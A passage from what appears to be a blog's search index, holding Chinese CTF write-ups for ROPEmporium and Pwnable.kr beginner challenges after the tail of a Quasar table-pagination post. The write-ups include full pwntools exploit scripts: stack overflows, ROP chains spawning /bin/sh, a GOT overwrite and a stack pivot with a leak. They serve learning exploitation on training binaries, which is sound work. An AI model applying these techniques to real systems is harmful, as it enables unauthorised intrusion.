问题在后端，当我请求表格数据时，需要提供两个参数pageNum和pageSize，含义与page和rowPerPage相同。我们考虑以下场景： 当前用户共有 11 条表格数据。假设用户选择每页显示 10 条数据，那么前端将发送请求?pageNum=1&amp;pageSize=10并拿到第 1 页的 10 条数据。然而此时，QTable会发现只获取了 10 条数据，因此分页器的下一页按钮处于不可用状态。这样一来，我们无法通过用户操作触发?pageNum=2&amp;pageSize=10请求，因此无法获取第 11 条数据。 换而言之，QTable的前端分页与后端分页无法兼容，但是后者是必须的，因为数据量非常大，不可能通过一次调用发送。 解决方案幸运的是，在这里我发现，Quasar 的开发者早就想到了这个问题，特地为服务端分页作了准备。回顾pagination的结构，我们还没有解释rowsNumber的作用：声明该字段代表我们将采用后端分页的方式，而它的含义就是表格数据的总行数（在上例中是 11）。这个值是后端返回给我们的。 同时，我们还需要给q-table组件添加属性@request。如果由于页数切换/排序/搜索导致当前页表格数据变化，那么就会触发request事件，执行对应的函数。看起来非常容易理解，然而这里却有坑点。 在我的项目中设置了： 12:pagination.sync=&quot;pagination&quot;@request=&quot;getList&quot; 那么getList函数将接收到参数props。此时，我们拥有两个pagination: this.pagination （用于设置pagination.sync属性） props.pagination 起初我采用了如下方式发送请求： 1pageNum=${this.pagination.page}&amp;pageSize=${this.pagination.rowsPerPage} 结果发现切到下一页时，尽管请求成功但表格并不变化，调试发现this.pagination并没有变！真正变化的是props.pagination，因此正解是将请求中的this替换为props。 总结所以，在QTable中使用服务端分页的正确姿势如下： 设置q-table组件的pagination.sync属性，注意必须有rowsNumber字段 设置q-table组件的@request属性，在这里执行异步调用获取数据 而在@request对应的函数中，需要： 利用props.pagination发送请求获取数据 用后端返回的值更新this.pagination 还可以加个 loading","link":"/post/QTableSSpagination/"},{"title":"ROPEmporium 学习","text":"针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。 ret2win最简单的ret2text，给了到ebp的偏移量，只需要找到函数ret2win的地址返回过去即可。 1234567891011from pwn import *p = process('./ret2win')elf = ELF('./ret2win')p.recvuntil('&gt;')payload = 'a'*0x28 + p64(elf.symbols['ret2win'])p.sendline(payload)p.interactive() split拆开了system和/bin/cat flag.txt，因此找到两者地址，准备好参数后返回到system上即可。 注意在 32 位上，只需要先放system地址，随后填充 4 字节返回地址，再放/bin/cat flag.txt地址即可。而 64 位上传参需要控制rdi寄存器，因此需要pop rdi; ret。 12345678910111213141516from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = process('./split')elf = ELF('./split')p.recvuntil('&gt;')pop_rdi_ret = 0x400883bin_cat_flag = 0x601060payload = flat(['a'*0x28, pop_rdi_ret, bin_cat_flag, elf.plt['system']])p.sendline(payload)p.interactive() callme题目要求是依次调用callme_one(1,2,3)，callme_two(1,2,3)，callme_three(1,2,3)。要控制三个参数就需要三个寄存器rdi rsi rdx，我们恰好能找到一条语句： 10x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret 之后就是布置好参数了： 123456789101112131415from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = process('./callme')elf = ELF('./callme')p.recvuntil('&gt;')pop_rdi_rsi_rdx_ret = 0x401ab0payload = flat(['a'*0x28, pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_one'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_two'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_three']])p.sendline(payload)p.interactive() write4/bin/cat flag.txt字符串彻底消失了，题目提示我们需要自己向内存中写入该字符串。checksec可知 GOT 表可写。 为了写 GOT 表，首先要控制寄存器，然后通过mov [reg], reg这样的语句来执行写操作，因此我们搜索一下： 12345678910111213141516171819$ ROPgadget --binary write4 --only 'mov|pop|ret'Gadgets information============================================================0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret0x0000000000400821 : mov dword ptr [rsi], edi ; ret0x00000000004007ae : mov eax, 0 ; pop rbp ; ret0x0000000000400820 : mov qword ptr [r14], r15 ; ret0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400890 : pop r14 ; pop r15 ; ret0x0000000000400892 : pop r15 ; ret0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x0000000000400893 : pop rdi ; ret0x0000000000400891 : pop rsi ; pop r15 ; ret0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004005b9 : ret 按照上述需求，我们可以选择布置好栈，执行pop r14 ; pop r15 ; ret控制r14和r15，随后mov qword ptr [r14], r15 ; ret进行写操作，最后pop rdi ; ret把写好的/bin/sh（总觉得拿到 shell 比读到 flag 更厉害一点）作为参数传入，需要注意的是字符串需要 8 字节对齐。 123456789101112131415161718from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = process('./write4')elf = ELF('./write4')p.recvuntil('&gt;')got_start = 0x601000pop_r14_r15_ret = 0x400890mov_r14_r15_ret = 0x400820pop_rdi_ret = 0x400893payload = flat(['a'*0x28, pop_r14_r15_ret, got_start, '/bin/sh'.ljust(8,'\\x00'), mov_r14_r15_ret, pop_rdi_ret, got_start, elf.plt['system']])p.sendline(payload)p.interactive() badchars题目屏蔽了一些关键字符，并提示了XOR，也就是说我们可以先写入被异或的关键字符，随后通过 gadgets 把它们异或回来。 题目告诉了我们被屏蔽的字符，所以我们可以先通过--badbytes选项避免指令地址中含有这些字符： 1$ ROPgadget --binary badchars --only 'mov|pop|ret' --badbytes '62|69|63|2f|20|66|6e|73' 随后，我们构造异或字符串，与 2 异或即可： 123s = '/bin/sh'.ljust(8,'\\x00')for i in range(len(s)): print hex(ord(s[i]) ^ 2) 得到： 1bin_sh = 0x026a712d6c6b602d 注意后面会被认为是小端法，所以这里倒序写。 然后，我们挑选如下的 gadgets： 1234567pop r12 ; pop r13 ; retmov qword ptr [r13], r12 ; retpop r14 ; pop r15 ; retxor byte ptr [r15], r14b ; retpop rdi ; ret 第 1,2,5 行和前面一样，而第 3-4 行控制寄存器r14和r15的值，使得r14=2（r14b即r14的低 8 位），r15存放我们刚刚写入的被异或的字符串地址，随后进行 8 次异或即可恢复出/bin/sh\\x00来。 12345678910111213141516171819202122232425262728from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = process('./badchars')elf = ELF('./badchars')p.recvuntil('&gt;')bin_sh = 0x026a712d6c6b602dgot_start = 0x601000pop_r12_r13_ret = 0x400b3bmov_r13_r12_ret = 0x400b34pop_r14_r15_ret = 0x400b40xor_r15_r14b_ret = 0x400b30pop_rdi_ret = 0x400b39payload = flat(['a'*0x28, pop_r12_r13_ret, bin_sh, got_start, mov_r13_r12_ret])for i in range(8): payload += flat([pop_r14_r15_ret, 2, got_start+i, xor_r15_r14b_ret])payload += flat([pop_rdi_ret, got_start, elf.plt['system']])p.sendline(payload)p.interactive() fluff本题减少了一些 gadget，我们不得不间接地通过寄存器写内存。注意这里用 ROPgadget 很难找到合适的 gadget，需要加个--depth参数。 1$ ROPgadget --binary fluff --depth 20 在众多 gadget 中要找到有用的，我们的思路还是如何去写内存。按照之前经验，还是需要mov [reg], reg的语句，这里就有一个： 10x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret 但是很不巧，没有pop r10; pop r11; ret这么好的 gadget 了，我们只能另辟蹊径去控制这两个寄存器。首先我们要把 GOT 表地址放进r10。然而我们连xor r10, reg这样的语句都没有，非常难受（xor [r10], reg是没有用的，因为无法改变r10本身）。 但是我们注意到，有这样一个 gadget： 10x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret 这里可以交换r11和r10的值，那么我们是不是可以通过控制r11，然后最后让它和r10交换从而控制r10呢？ 我们发现是可以的，因为有： 120x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret 这两个 gadget 让我们想到：我们可以先通过第一个 gadget 清零r11，然后用第二个 gadget 让r11和r12异或，此时就等同于mov r11, r12了。而r12是很好控制的： 10x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret 这样就可以构造 ROP 链先把地址写入r10： 1234567got_start = 0x601000xor_r11_r11 = 0x400822pop_r12 = 0x400832xor_r11_r12 = 0x40082fxchg_r11_r10 = 0x400840payload = flat(['a'*40, xor_r11_r11, 'a'*8, pop_r12, got_start, xor_r11_r12, 'a'*8, xchg_r11_r10, 'a'*8]) 这里的'a'*8是为了解决后面的无用pop。 第二步，向r11写入/bin/sh\\x00，其实和上面同理： 1payload += flat([xor_r11_r11, 'a'*8, pop_r12, '/bin/sh'.ljust(8,'\\x00'), xor_r11_r12, 'a'*8]) 第三步，向r10中的地址写入r11中的数据，需要注意的是由于该 gadget 后半部分会pop r12并且将r12也去和r10中的地址存放的值异或，此时我们必须控制r12为 0： 123mov_r10_r11 = 0x40084epop_rdi_ret = 0x4008c3payload += flat([mov_r10_r11, 'a'*8, 0, pop_rdi_ret, got_start, elf.plt['system']]) pivotstack pivoting就是在栈空间较小的情况下，把esp移到别的地方去，这样就能有更多空间写 ROP 链了。 这一关大意是要调用libpivot.so中的ret2win函数，也就是第一关的那个。此外，还有个uselessFunction里调用了libpivot.so里的foothold_function。 IDA 得到的源码如下： 1234567891011121314151617181920212223242526272829int __cdecl main(int argc, const char **argv, const char **envp){ char *ptr; // ST08_8 setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(&quot;pivot by ROP Emporium&quot;); puts(&quot;64bits\\n&quot;); ptr = (char *)malloc(0x1000000uLL); pwnme(ptr + 16776960); free(ptr); puts(&quot;\\nExiting&quot;); return 0;}char *__fastcall pwnme(char *a1){ char s; // [rsp+10h] [rbp-20h] memset(&amp;s, 0, 0x20uLL); puts(&quot;Call ret2win() from libpivot.so&quot;); printf(&quot;The Old Gods kindly bestow upon you a place to pivot: %p\\n&quot;, a1); puts(&quot;Send your second chain now and it will land there&quot;); printf(&quot;&gt; &quot;); fgets(a1, 256, stdin); puts(&quot;Now kindly send your stack smash&quot;); printf(&quot;&gt; &quot;, 256LL); return fgets(&amp;s, 64, stdin);} 注意到这里的a1会被打印出来，随后被fgets写入。我们想尝试让rsp指向a1来改变rsp位置。这个比较简单，只需要 gadget： 12pop rax; retxchg rax, rsp; ret 通过pop rax把a1的地址写入rax，然后交换，那么rsp就指向了a1，我们完成了stack pivoting。 这题容易搞混的地方是，我们的思路是先填first stage进行stack pivoting（也就是上述过程），再填second stage调用ret2win，但是程序中输入的顺序是相反的。 下面我们来看second stage，也就是考虑我们要先输入什么。我们最终肯定是想返回到ret2win，但是我们不知道它的地址。checksec libpivot.so可以发现还开启了 ASLR。因此可以想到这里foothold_function就是用来定位用的。 首先（通过.plt）调用一次foothold_function更新其.got.plt，随后将这个.got.plt项的地址pop给rax，接着读取[rax]也就是这个.got.plt项的内容，即得到了foothold_function真实地址。 最后，可以根据它在libpivot.so中到ret2win的相对偏移来拿到ret2win的真实地址。这个相对偏移可以通过nm libpivot.so得到：前者在0x0970，后者在0x0abe，相差0x14e。最后我们还是利用 gadget 计算出ret2win的真实地址后，call一下即可。 12345678910111213141516171819202122232425262728293031from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = process('./pivot')elf = ELF('./pivot')p.recvuntil('pivot: ')a1 = int(p.recvuntil('\\n'), 16)print hex(a1)foothold_plt = elf.plt['foothold_function']foothold_got = elf.got['foothold_function']pop_rax_ret = 0x400b00mov_rax_rax = 0x400b05pop_rbp_ret = 0x400900add_rax_rbp = 0x400b09call_rax = 0x40098epayload = flat([foothold_plt, pop_rax_ret, foothold_got, mov_rax_rax, pop_rbp_ret, 0x14e, add_rax_rbp, call_rax])p.recvuntil('&gt;')p.sendline(payload)xchg_rax_rsp = 0x400b02payload = flat(['a'*0x28, pop_rax_ret, a1, xchg_rax_rsp])p.recvuntil('&gt;')p.sendline(payload)p.interactive() ret2csu这题要求我们调用ret2win但是第三个参数必须是0xdeadcafebabebeef，并且 ROPgadget 几乎找不到有用的 gadget 比如pop rdx; ret。结合题目名可知本题需要采用ret2csu的技巧。 在__libc_csu_init中，有 gadget1： 1234567pop rbxpop rbppop r12pop r13pop r14pop r15retn 和 gadget2： 1234mov rdx, r15mov rsi, r14mov edi, r13dcall qword ptr [r12+rbx*8] 可以看到，这里rdx, rsi, edi正好是 64 位下函数的前三个参数，而它们的值在这里来源于r15, r14, r13d，后三者又恰好可以被 gadget1 控制；而最后一句call中的r12和rbx我们同样可以在 gadget1 中控制。 然而，gadget2 不是以ret结尾的，这样我们必须考虑它后面的汇编代码依旧能正常执行下去： 123456789101112add rbx, 1cmp rbp, rbxjnz short loc_400880add rsp, 8pop rbxpop rbppop r12pop r13pop r14pop r15retn 这里为了让它继续向下执行，我们不妨让rbx=0; rbp=1；至于下面多余的pop就用填充处理掉就好了。 最后还有一个call qword ptr [r12+rbx*8]是我们可控的，但是这里尝试调用ret2win是会引起段错误的，不能直接调用。我们只有不引起段错误，才能让 gadget2 成功执行到ret，那么我们就想随便调用一个不会改变rdx的值的函数。 例如，可以调用.dynamic段的_fini，这个函数非常简单： 123sub rsp,0x8add rsp,0x8ret 那么我们控制r12指向_fini即可，因为rbx会被我们设置为 0 所以不用考虑。注意是指向，也就是说[r12]才是_fini的地址，后者可以gdb中info func得到在0x4008b4，但是我们需要赋值给r12的实际上是指向0x4008b4这个地址的指针。 我们可以这样看： 123456pwndbg&gt; x/20x &amp;_DYNAMIC0x600e20: 0x00000001 0x00000000 0x00000001 0x000000000x600e30: 0x0000000c 0x00000000 0x00400560 0x000000000x600e40: 0x0000000d 0x00000000 0x004008b4 0x000000000x600e50: 0x00000019 0x00000000 0x00600e10 0x000000000x600e60: 0x0000001b 0x00000000 0x00000008 0x00000000 可以看到在0x600e48的指针指向0x4008b4，这就是我们要赋值给r12的值。 12345678910111213141516171819from pwn import *context(arch='amd64', os='linux', log_level='DEBUG')p = process('./ret2csu')elf = ELF('./ret2csu')p.recvuntil('&gt;')ret2win = elf.symbols['ret2win']gadget1 = 0x40089agadget2 = 0x400880fini_p = 0x600e48arg3 = 0xdeadcafebabebeefpayload = flat(['a'*0x28, gadget1, 0, 1, fini_p, 0, 0, arg3, gadget2,0,0,0,0,0,0,0, ret2win])p.sendline(payload)p.interactive()","link":"/post/ROPEmporium/"},{"title":"Pwnable.kr Toddler&#39;s Bottle 解题记录","text":"画风很可爱的 Pwn 题练习网站。 fd123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&quot;pass argv[1] a number\\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\\n&quot;, buf)){ printf(&quot;good job :)\\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\\n&quot;); return 0;} 这里需要传入一个命令行参数，用它减去0x1234后得到fd也就是 Linux 下的文件描述符，并读取对应的文件到buf中。我们当然可以创建一个文件，但是控制其 fd 比较麻烦；但我们知道，Linux 下标准输入流也有自己的 fd，即 0。因此我们只需要传入0x1234的十进制形式4660，并在标准输入中输入LETMEWIN\\n即可： 123$ ./fd 4660LETMEWIN collision12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){ int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++){ res += ip[i]; } return res;}int main(int argc, char* argv[]){ if(argc&lt;2){ printf(&quot;usage : %s [passcode]\\n&quot;, argv[0]); return 0; } if(strlen(argv[1]) != 20){ printf(&quot;passcode length should be 20 bytes\\n&quot;); return 0; } if(hashcode == check_password( argv[1] )){ system(&quot;/bin/cat flag&quot;); return 0; } else printf(&quot;wrong passcode.\\n&quot;); return 0;} 首先要求输入 20 字节的密码（显然是个char *），然后将它强制转换为int *类型。我们知道，一个char是 1 字节，而一个int是 4 字节，因此 20 字节的char数组会变成 5 个int组成的int数组。 这 5 个int会被累加，然后要求其和等于hashcode。换而言之随便找 5 个加起来等于hashcode的十六进制数就行了： 1234$ python -c 'print hex(0x21dd09ec-0x01010101*4)'0x1dd905e8$ ./col $(python -c 'print &quot;\\xe8\\x05\\xd9\\x1d&quot;+&quot;\\x01&quot;*16') 注意默认小端法表示。 bof123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\\n&quot;); }}int main(int argc, char* argv[]){ func(0xdeadbeef); return 0;} 从 IDA 中观察到overflowme在ebp-2c，而key在ebp+8，相差0x34。栈上大概是这样的： 12345678910111213 HIGH ADDRESS ----------------------| the states of main() | // caller ----------------------| args of func() | // including key. Also in caller's state ----------------------| retaddr of func() | ----------------------| saved ebp | &lt;- ebp ----------------------| local vars of func() | // including overflowme[] ---------------------- &lt;- esp LOW ADDRESS 了解这些后，我们用0x34字节数据作填充，然后用0xcafebabe覆盖掉key即可。 1234567891011from pwn import *context.log_level = 'DEBUG'# p = process('./bof')p = remote('pwnable.kr', 9000)payload = 'a'*0x34 + p32(0xcafebabe)p.sendline(payload)p.interactive() flag在 Hex-View 中发现是 UPX 加壳的，upx -d脱壳。 脱壳后的程序提示会malloc然后strcpy本题的 flag，查看汇编代码，发现这里 flag 的变量名是cs:flag，跟踪变量得到 flag。 passcode12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login(){ int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337){ printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); } else{ printf(&quot;Login Failed!\\n&quot;); exit(0); }}void welcome(){ char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);}int main(){ printf(&quot;Toddler's Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;} 直接输入 passcode 的话会显示段错误，显然是因为两个scanf都没有在变量前加&amp;，直接往变量值所代表的地址上写了。 换句话说，我们可以输入适当的passcode来控制两个局部变量的地址，使得他们等于那两个数值。而存储那两个数值的地址，只能来自于我们输入的name。 然而这两个数值代表的地址未必可写，name和两个passcode也位于不同栈帧，无法缓冲区溢出来覆盖。到这一步似乎卡住了。但经过反汇编发现name在ebp-0x70，passcode1在ebp-0x10，两者相差 96 字节且位于同一栈帧，换句话说name是可以覆盖passcode1的，这样看似乎又有希望。 注意到login中，scanf第一次后调用了fflush。因此我们可以考虑利用scanf的写特性写 GOT 表，因为 GOT 表肯定是可写的。那么我们可以先用fflush的 GOT 地址（不止fflush，程序中包含的 GLIBC 函数都行）覆盖passcode1的值，然后通过scanf对passcode1的值所代表的地址（也就是fflush的 GOT）写入system(&quot;/bin/cat flag&quot;)的地址。这样相当于将fflush函数劫持到了system(&quot;/bin/cat flag&quot;)上。 objdump -R passcode导出程序动态重定向表，拿到fflush的 GOT 地址0804a004；然后 gdb 里disas login拿到system(&quot;/bin/cat flag&quot;)的地址080485e3，注意这个地址实际上是call system的前一句：movl $0x80487af,(%esp)，也就是准备system函数的参数的语句。最后发 payload： 1234567$ python&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; context.log_level = 'DEBUG'&gt;&gt;&gt; p = process('./passcode')&gt;&gt;&gt; p.sendline('a'*96+p32(0x0804a004))&gt;&gt;&gt; p.sendline(str(0x080485e3))&gt;&gt;&gt; p.interactive() 需要注意的是，scanf的时候接收%d，因此需要str一下转成十进制字符串。 注： GLIBC 函数的 GOT 地址，在 pwntools 中可以用类似elf.got['fflush']的方法获得，更加方便 如果开启了 PIE 则需要 leak 出 GOT 地址。 random123456789101112131415161718#include &lt;stdio.h&gt;int main(){ unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(&quot;Good!\\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; } printf(&quot;Wrong, maybe you should try 2^32 cases.\\n&quot;); return 0;} 我们都知道 C 的rand函数是伪随机，随机性取决于srand函数设定的种子，这个种子默认为1。因此random变量实际上是固定的，只要在栈上把他读出来即可。 random是函数的局部变量，并且是unsigned int，因此应该在ebp-4的位置。我们在有deadbeef的那行下断点，随便输入后，在 gdb 中输入x/8x $rbp-4，即可读取到： 120x7ffefe6d5d0c: 0x6b8b4567 0x00400670 0x00000000 0x4439d8300x7ffefe6d5d1c: 0x00007f68 0x00000001 0x00000000 0xfe6d5df8 也就是说，0x6b8b4567就是这个random，我们由此可以算出key为3039230856。 input非常好玩的一题，涵盖了 Linux 下各种基本的通信方式。 先说一下这题的坑点：/home/input下我们没有写权限，而/tmp目录下有写权限没有读权限，所以比较好的方法是在/tmp下新建个目录，把 flag 软链接（ln -s /home/input2/flag ./flag）到这个目录里，脚本放在同一目录下运行。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[]){ printf(&quot;Welcome to pwnable.kr\\n&quot;); printf(&quot;Let's see if you know how to give input to program\\n&quot;); printf(&quot;Just give me correct inputs then you will get the flag :)\\n&quot;); // argv if(argc != 100) return 0; if(strcmp(argv['A'],&quot;\\x00&quot;)) return 0; if(strcmp(argv['B'],&quot;\\x20\\x0a\\x0d&quot;)) return 0; printf(&quot;Stage 1 clear!\\n&quot;); // stdio char buf[4]; read(0, buf, 4); if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0; read(2, buf, 4); if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0; printf(&quot;Stage 2 clear!\\n&quot;); // env if(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0; printf(&quot;Stage 3 clear!\\n&quot;); // file FILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;); if(!fp) return 0; if( fread(buf, 4, 1, fp)!=1 ) return 0; if( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0; fclose(fp); printf(&quot;Stage 4 clear!\\n&quot;); // network int sd, cd; struct sockaddr_in saddr, caddr; sd = socket(AF_INET, SOCK_STREAM, 0); if(sd == -1){ printf(&quot;socket error, tell admin\\n&quot;); return 0; } saddr.sin_family = AF_INET; saddr.sin_addr.s_addr = INADDR_ANY; saddr.sin_port = htons( atoi(argv['C']) ); if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ printf(&quot;bind error, use another port\\n&quot;); return 1; } listen(sd, 1); int c = sizeof(struct sockaddr_in); cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); if(cd &lt; 0){ printf(&quot;accept error, tell admin\\n&quot;); return 0; } if( recv(cd, buf, 4, 0) != 4 ) return 0; if(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0; printf(&quot;Stage 5 clear!\\n&quot;); // here's your flag system(&quot;/bin/cat flag&quot;); return 0;} 可以看到一共有 5 关： 第一关要求有 100 个命令行参数，其中第 64 个是\\x00，第 65 个是\\x20\\x0a\\x0d； 第二关分别从标准输入和标准错误流中读取，要求读到的信息分别是\\x00\\x0a\\x00\\xff和\\x00\\x0a\\x00\\xff，由于我们无法控制标准错误流，可以采用管道重定向的方式； 第三关需要我们设置环境变量\\xde\\xad\\xbe\\xef=\\xca\\xfe\\xba\\xbe； 第四关读取一个文件，要求前四个字节是\\x00\\x00\\x00\\x00； 第五关建立了一个 socket，监听的端口来自第 66 个命令行参数，且期望收到的消息是\\xde\\xad\\xbe\\xef。 编写 python 脚本： 12345678910111213141516171819202122232425262728293031323334import osimport subprocessimport socketimport time# stage 1args = list(&quot;A&quot;*100)args[0] = &quot;/home/input2/input&quot;args[ord('A')] = &quot;&quot;args[ord('B')] = &quot;\\x20\\x0a\\x0d&quot;args[ord(&quot;C&quot;)] = &quot;8080&quot;# stage 2stdin_r, stdin_w = os.pipe()stderr_r, stderr_w = os.pipe()os.write(stdin_w, &quot;\\x00\\x0a\\x00\\xff&quot;)os.write(stderr_w, &quot;\\x00\\x0a\\x02\\xff&quot;)# stage 3env = {&quot;\\xde\\xad\\xbe\\xef&quot;: &quot;\\xca\\xfe\\xba\\xbe&quot;}# stage 4with open(&quot;\\x0a&quot;, &quot;wb&quot;) as f: f.write(&quot;\\x00&quot;*4)# open a subprocess here because we need a serverp = subprocess.Popen(args, stdin=stdin_r,stderr=stderr_r,env=env)# stage 5s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)time.sleep(1) # wait 4 servers.connect((&quot;127.0.0.1&quot;, 8080))s.send(&quot;\\xde\\xad\\xbe\\xef&quot;)s.close() leg1234567891011121314151617181920212223242526272829303132333435363738#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1(){ asm(&quot;mov r3, pc\\n&quot;);}int key2(){ asm( &quot;push {r6}\\n&quot; &quot;add r6, pc, $1\\n&quot; &quot;bx r6\\n&quot; &quot;.code 16\\n&quot; &quot;mov r3, pc\\n&quot; &quot;add r3, $0x4\\n&quot; &quot;push {r3}\\n&quot; &quot;pop {pc}\\n&quot; &quot;.code 32\\n&quot; &quot;pop {r6}\\n&quot; );}int key3(){ asm(&quot;mov r3, lr\\n&quot;);}int main(){ int key=0; printf(&quot;Daddy has very strong arm! : &quot;); scanf(&quot;%d&quot;, &amp;key); if( (key1()+key2()+key3()) == key ){ printf(&quot;Congratz!\\n&quot;); int fd = open(&quot;flag&quot;, O_RDONLY); char buf[100]; int r = read(fd, buf, 100); write(0, buf, r); } else{ printf(&quot;I have strong leg :P\\n&quot;); } return 0;} 同时，本题也给出了对应的 gdb 反汇编结果，显然是 arm 汇编指令。参考 arm 架构下： 采用 RISC 指令集 pc 指向当前执行指令地址+8 处 r0 保存返回值 r11 对应 ebp，r13 对应 esp r15 即 pc，存储当前指令+8（thumb 模式下+4）的位置（即后两条指令） arm 模式下指令长度 4 字节，thumb 模式下 2 字节 bx：带状态切换的跳转 知道了这些后，逐函数查看，先是 key1： 12345678910(gdb) disass key1Dump of assembler code for function key1: 0x00008cd4 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cd8 &lt;+4&gt;: add r11, sp, #0 0x00008cdc &lt;+8&gt;: mov r3, pc 0x00008ce0 &lt;+12&gt;: mov r0, r3 0x00008ce4 &lt;+16&gt;: sub sp, r11, #0 0x00008ce8 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008cec &lt;+24&gt;: bx lrEnd of assembler dump. 前两句和后三句是 arm 的函数入栈出栈返回操作，中间给 r3 赋值0x00008ce4并返回。 key2： 1234567891011121314151617(gdb) disass key2Dump of assembler code for function key2: 0x00008cf0 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008cf4 &lt;+4&gt;: add r11, sp, #0 0x00008cf8 &lt;+8&gt;: push {r6} ; (str r6, [sp, #-4]!) 0x00008cfc &lt;+12&gt;: add r6, pc, #1 0x00008d00 &lt;+16&gt;: bx r6 0x00008d04 &lt;+20&gt;: mov r3, pc 0x00008d06 &lt;+22&gt;: adds r3, #4 0x00008d08 &lt;+24&gt;: push {r3} 0x00008d0a &lt;+26&gt;: pop {pc} 0x00008d0c &lt;+28&gt;: pop {r6} ; (ldr r6, [sp], #4) 0x00008d10 &lt;+32&gt;: mov r0, r3 0x00008d14 &lt;+36&gt;: sub sp, r11, #0 0x00008d18 &lt;+40&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d1c &lt;+44&gt;: bx lrEnd of assembler dump. 第三行保存 r6，第四行 r6 变成0x00008d05，第五行进行带状态切换的跳转，由于 r6 最低位为 1，切换为 thumb 模式并跳转到0x00008d04，也就是第六行。 第六行，由于处于 thumb 模式，pc 指向当前指令+4 的位置，r3 变成0x00008d08。第七行 r3+4 变成0x0008d0c，这就是最终的返回值。 key3： 1234567891011(gdb) disass key3Dump of assembler code for function key3: 0x00008d20 &lt;+0&gt;: push {r11} ; (str r11, [sp, #-4]!) 0x00008d24 &lt;+4&gt;: add r11, sp, #0 0x00008d28 &lt;+8&gt;: mov r3, lr 0x00008d2c &lt;+12&gt;: mov r0, r3 0x00008d30 &lt;+16&gt;: sub sp, r11, #0 0x00008d34 &lt;+20&gt;: pop {r11} ; (ldr r11, [sp], #4) 0x00008d38 &lt;+24&gt;: bx lrEnd of assembler dump.(gdb) 这里将 lr 赋值给 r3，然后 r3 作为返回值。而 lr 相当于return address，需要我们回到 main 里去看相关调用： 1234567891011... 0x00008d64 